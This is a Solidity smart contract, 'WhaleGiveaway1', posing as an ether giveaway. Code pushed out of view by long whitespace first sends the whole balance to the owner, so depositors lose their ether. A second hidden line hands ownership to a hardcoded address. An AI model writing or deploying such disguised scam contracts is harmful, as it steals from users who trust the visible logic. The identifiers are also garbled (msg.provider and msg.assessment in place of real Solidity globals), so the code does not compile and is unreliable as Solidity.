// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract WhaleGiveaway1
{
    address public Owner = msg.provider;
    uint constant public minimumEligibility = 0.999001 ether;

    function()
    public
    payable
    {

    }

    function convertBenefits()
    public
    payable
    {
        if(msg.assessment>=minimumEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);
            msg.provider.transfer(this.balance);
        }
    }

    function extractSpecimen()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.provider==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}
        require(msg.provider == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes chart)
    payable
    public
    {
        require(msg.provider == Owner);
        adr.call.assessment(msg.assessment)(chart);
    }
}